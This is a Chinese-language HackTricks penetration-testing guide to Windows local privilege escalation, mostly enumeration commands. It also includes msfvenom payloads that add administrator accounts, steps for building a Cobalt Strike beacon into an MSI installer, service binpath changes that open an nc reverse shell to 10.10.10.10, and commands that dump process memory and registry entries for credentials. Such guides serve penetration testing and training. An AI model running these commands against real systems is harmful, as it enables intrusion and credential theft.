# Windows 本地权限提升

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？你想在**HackTricks**中看到你的**公司广告**吗？或者你想要访问**最新版本的 PEASS 或下载 HackTricks 的 PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在**推特**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

### **寻找 Windows 本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初始 Windows 理论

### 访问令牌

**如果你不知道什么是 Windows 访问令牌，请在继续之前阅读以下页面：**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**如果你不知道本节标题中使用的任何缩写词，请在继续之前阅读以下页面：**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### 完整性级别

**如果你不知道 Windows 中的完整性级别是什么，请在继续之前阅读以下页面：**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows 安全控制

Windows 中有不同的东西可能**阻止你枚举系统**，运行可执行文件或甚至**检测你的活动**。你应该**阅读**以下**页面**并**枚举**所有这些**防御** **机制**，在开始权限提升枚举之前：

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## 系统信息

### 版本信息枚举

检查 Windows 版本是否有任何已知的漏洞（也检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞

此[站点](https://msrc.microsoft.com/update-guide/vulnerability)适用于搜索有关Microsoft安全漏洞的详细信息。此数据库包含超过4,700个安全漏洞，显示了Windows环境呈现的**巨大攻击面**。

**在系统上**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas内嵌了watson)_

**使用系统信息在本地**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github漏洞仓库:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

环境变量中保存了任何凭据/有价值的信息吗？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell 历史记录
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 脚本文件

您可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何开启这个功能。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell 模块日志记录

它记录了 PowerShell 的管道执行细节。这包括被执行的命令，包括命令调用和部分脚本。它可能没有执行的全部细节和输出结果。\
您可以按照最后一节的链接（转录文件）启用此功能，但要启用的是“模块日志记录”，而不是“PowerShell 转录”。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
查看最后15个来自PowersShell日志的事件，您可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **脚本块日志记录**

它记录执行时的代码块，因此能够捕获脚本的完整活动和全部内容。它保留每项活动的完整审计迹象，这些迹象稍后可用于取证和研究恶意行为。它记录执行时的所有活动，因此提供了完整的细节。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
```markdown
Script Block 日志记录事件可以在 Windows 事件查看器的以下路径找到：_应用程序和服务日志 > 微软 > Windows > Powershell > 操作_\
要查看最近的 20 个事件，您可以使用：
```
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过http**S**而是http请求的，你可以攻破系统。

你可以通过运行以下命令来检查网络是否使用了非SSL WSUS更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
如果你收到如下回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 等于 `1`。

那么，**它是可利用的。** 如果最后一个注册表等于 0，那么 WSUS 条目将被忽略。

为了利用这些漏洞，你可以使用工具，如：[Wsuxploit](https://github.com/pimps/wsuxploit)，[pyWSUS](https://github.com/GoSecure/pywsus) - 这些是用于将“假”更新注入非 SSL WSUS 流量的 MiTM 武器化利用脚本。

阅读研究报告：

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**阅读完整报告**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本上，这是这个漏洞利用的缺陷：

> 如果我们有权修改我们的本地用户代理，并且 Windows 更新使用 Internet Explorer 设置中配置的代理，那么我们就有能力在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来拦截我们自己的流量，并以提升的用户身份在我们的资产上运行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，它也将使用其证书存储。如果我们为 WSUS 主机名生成一个自签名证书，并将此证书添加到当前用户的证书存储中，我们将能够拦截 HTTP 和 HTTPS WSUS 流量。WSUS 不使用类似 HSTS 的机制来实施信任首次使用类型的证书验证。如果用户信任所呈现的证书，并且具有正确的主机名，它将被服务接受。

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（一旦它被释放）来利用这个漏洞。

## KrbRelayUp

这本质上是一个通用的无修复 **本地权限提升** 在 **域** 环境中的 windows，其中 **LDAP 签名未被强制执行**，用户有自我权利（配置 **RBCD**）并且用户可以在域中创建计算机。\
所有的 **要求** 都是用 **默认设置** 满足的。

在 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 找到 **利用工具**

即使攻击是有关攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**如果** 这两个注册表 **启用**（值是 **0x1**），那么任何权限的用户都可以 **安装**（执行）`*.msi` 文件作为 NT AUTHORITY\\**SYSTEM**。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit 负载
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
```markdown
如果你有一个meterpreter会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化这个技术。

### PowerUP

使用power-up的`Write-UserAddMSI`命令在当前目录内创建一个Windows MSI二进制文件来提升权限。这个脚本会写出一个预编译的MSI安装程序，它会提示添加用户/组（因此你将需要GIU访问）：
```
```
Write-UserAddMSI
```
只需执行创建的二进制文件来提升权限。

### MSI Wrapper

阅读本教程学习如何使用这些工具创建MSI包装器。请注意，如果您只想执行命令行，您可以包装一个"**.bat**"文件。

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### 使用WIX创建MSI

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### 使用Visual Studio创建MSI

* 使用Cobalt Strike或Metasploit生成一个新的Windows EXE TCP有效载荷，保存在`C:\privesc\beacon.exe`
* 打开**Visual Studio**，选择**创建一个新项目**并在搜索框中输入"installer"。选择**安装向导**项目并点击**下一步**。
* 给项目起一个名字，比如**AlwaysPrivesc**，使用**`C:\privesc`**作为位置，选择**将解决方案和项目放在同一目录中**，然后点击**创建**。
* 一直点击**下一步**直到第3步（选择要包含的文件）。点击**添加**并选择你刚生成的Beacon有效载荷。然后点击**完成**。
* 在**解决方案资源管理器**中突出显示**AlwaysPrivesc**项目，在**属性**中，将**目标平台**从**x86**更改为**x64**。
* 还有其他属性您可以更改，例如**作者**和**制造商**，这可以使安装的应用程序看起来更合法。
* 右键点击项目并选择**查看 > 自定义操作**。
* 右键点击**安装**并选择**添加自定义操作**。
* 双击**应用程序文件夹**，选择您的**beacon.exe**文件并点击**确定**。这将确保安装程序运行时立即执行beacon有效载荷。
* 在**自定义操作属性**下，将**Run64Bit**更改为**True**。
* 最后，**构建它**。
* 如果出现警告`File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保您将平台设置为x64。

### MSI安装

要在**后台**执行恶意`.msi`文件的**安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用这个漏洞，你可以使用：_exploit/windows/local/always\_install\_elevated_

## 杀毒软件和检测器

### 审计设置

这些设置决定了什么被**记录**，因此你应该注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding（Windows事件转发），了解日志发送到哪里很重要
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 允许您**管理本地管理员密码**（该密码是**随机的**，唯一的，并且**定期更改**) 在域加入的计算机上。这些密码集中存储在 Active Directory 中，并使用 ACLs 限制授权用户访问。如果您的用户被授予足够的权限，您可能能够读取本地管理员的密码。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

如果激活，**明文密码将存储在 LSASS**（本地安全权限子系统服务）中。
[**关于 WDigest 的更多信息在此页面**](../stealing-credentials/credentials-protections.md#wdigest).
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA 保护

Microsoft 在 **Windows 8.1 及以后的版本** 中为 LSA 提供了额外的保护，以**防止**不受信任的进程能够**读取其内存**或注入代码。\
[**关于 LSA 保护的更多信息在此**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### 凭证保护

**Credential Guard** 是Windows 10（企业版和教育版）中的一项新功能，它有助于保护机器上的凭证不受如传递哈希这类威胁的侵害。\
[**关于Credential Guard的更多信息在这里。**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### 缓存凭证

**域凭证**由操作系统组件使用，并由**本地安全权限**（LSA）进行**认证**。通常，当注册的安全包验证用户的登录数据时，会为用户建立域凭证。\
[**关于缓存凭证的更多信息在这里**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

您应该检查您所属的任何组是否具有有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果您**属于某个特权组，您可能能够提升权限**。在这里了解有关特权组的信息以及如何滥用它们来提升权限：

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### 令牌操作

在此页面了解更多关于什么是**令牌**的信息：[**Windows 令牌**](../authentication-credentials-uac-and-efs.md#access-tokens)。\
查看以下页面，**了解有趣的令牌**以及如何滥用它们：

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### 已登录用户 / 会话
```
qwinsta
klist sessions
```
### 家目录
```
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```
net accounts
```
### 获取剪贴板的内容
```bash
powershell -command "Get-Clipboard"
```
## 运行中的进程

### 文件和文件夹权限

首先，列出进程时**检查进程命令行中是否有密码**。\
检查你是否可以**覆盖正在运行的某些二进制文件**，或者你是否拥有二进制文件夹的写权限，以利用可能的[**DLL劫持攻击**](dll-hijacking.md)：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查可能运行的 [**electron/cef/chromium 调试器**，您可以滥用它来提升权限](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件夹的权限（**[**DLL劫持**](dll-hijacking.md)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 内存密码挖掘

您可以使用 sysinternals 的 **procdump** 创建正在运行的进程的内存转储。像 FTP 这样的服务在内存中有**明文的凭据**，尝试转储内存并读取凭据。
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的GUI应用程序

**以SYSTEM身份运行的应用程序可能允许用户生成CMD，或浏览目录。**

示例："Windows帮助与支持"（Windows + F1），搜索"命令提示符"，点击"点击以打开命令提示符"

## 服务

获取服务列表：
```
net start
wmic service list brief
sc query
Get-Service
```
### 权限

您可以使用 **sc** 获取服务的信息
```
sc qc <service_name>
```
建议使用 _Sysinternals_ 的二进制文件 **accesschk** 来检查每项服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查“已认证用户”是否可以修改任何服务：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[您可以从这里下载适用于XP的accesschk.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果您遇到此错误（例如使用SSDPSRV）：

_系统错误 1058 已发生。_\
_服务无法启动，因为它被禁用或与之关联的设备未启用。_

您可以使用以下方法来启用它：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务 upnphost 依赖 SSDPSRV 才能工作（适用于 XP SP1）**

**另一个解决方法** 是运行：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

如果“已认证用户”组在某个服务上拥有 **SERVICE\_ALL\_ACCESS** 权限，那么它可以修改该服务正在执行的二进制文件。要修改它并执行 **nc**，你可以做：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
其他权限可用于提升权限：
**SERVICE_CHANGE_CONFIG** 可以重新配置服务二进制文件
**WRITE_DAC:** 可以重新配置权限，导致 SERVICE_CHANGE_CONFIG
**WRITE_OWNER:** 可以成为所有者，重新配置权限
**GENERIC_WRITE:** 继承 SERVICE_CHANGE_CONFIG
**GENERIC_ALL:** 继承 SERVICE_CHANGE_CONFIG

**检测和利用**这个漏洞，你可以使用 _exploit/windows/local/service_permissions_

### 服务二进制文件的弱权限

**检查你是否可以修改由服务执行的二进制文件**或者你是否对存放二进制文件的**文件夹有写权限**（[**DLL 劫持**](dll-hijacking.md))**。**
你可以使用 **wmic** 获取每个由服务执行的二进制文件（不在 system32 中），并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
您还可以使用 **sc** 和 **icacls**：
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

您应该检查是否可以修改任何服务注册表。\
您可以通过以下方式**检查**对服务**注册表**的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
检查**Authenticated Users**或**NT AUTHORITY\INTERACTIVE**是否拥有FullControl权限。如果是这样，您可以更改服务将要执行的二进制文件。

要更改执行的二进制文件的路径：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 服务注册表 AppendData/AddSubdirectory 权限

如果你对一个注册表拥有这个权限，这意味着**你可以从这个注册表创建子注册表**。在Windows服务的情况下，这**足以执行任意代码：**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### 未加引号的服务路径

如果可执行文件的路径没有放在引号内，Windows将尝试执行每个空格前的结束路径。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows将尝试执行：
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
要列出所有未加引号的服务路径（不包括内置的Windows服务）
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**您可以使用metasploit检测和利用**此漏洞：_exploit/windows/local/trusted_service_path_\
您可以手动使用metasploit创建服务二进制文件：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

可以指示Windows在[执行服务失败时应该做什么](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN)。如果该设置指向一个可被覆盖的二进制文件，你可能能够提升权限。

## 应用程序

### 已安装的应用程序

检查**二进制文件的权限**（也许你可以覆盖一个并提升权限）和**文件夹**的权限（[DLL劫持](dll-hijacking.md)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某些配置文件以读取某些特殊文件，或者是否可以修改某些将由管理员帐户执行的二进制文件（schedtasks）。

在系统中查找权限不足的文件夹/文件的方法是：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 开机启动

**检查你是否可以覆盖某些将由不同用户执行的注册表或二进制文件。**\
**阅读** **以下页面** 了解更多关于有趣的 **开机启动位置以提升权限** 的信息：

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### 驱动程序

寻找可能的 **第三方奇怪/易受攻击** 的驱动程序
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL 劫持

如果你在 **PATH 中存在的文件夹内拥有写权限**，你可能能够劫持一个进程加载的 DLL 并**提升权限**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts 文件

检查 hosts 文件中是否硬编码了其他已知计算机
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

检查是否有**外部限制的服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**查看此页面以获取与防火墙相关的命令**](../basic-cmd-for-pentesters.md#firewall) **（列出规则，创建规则，关闭，关闭...）**

更多[网络枚举命令在此](../basic-cmd-for-pentesters.md#network)

### Windows子系统（wsl）
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
```markdown
二进制文件 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 找到

如果你获得了root用户权限，你可以监听任何端口（第一次使用 `nc.exe` 监听端口时，它会通过GUI询问是否应该允许 `nc` 通过防火墙）。
```
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要轻松以 root 身份启动 bash，您可以尝试 `--default-user root`

您可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中探索 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
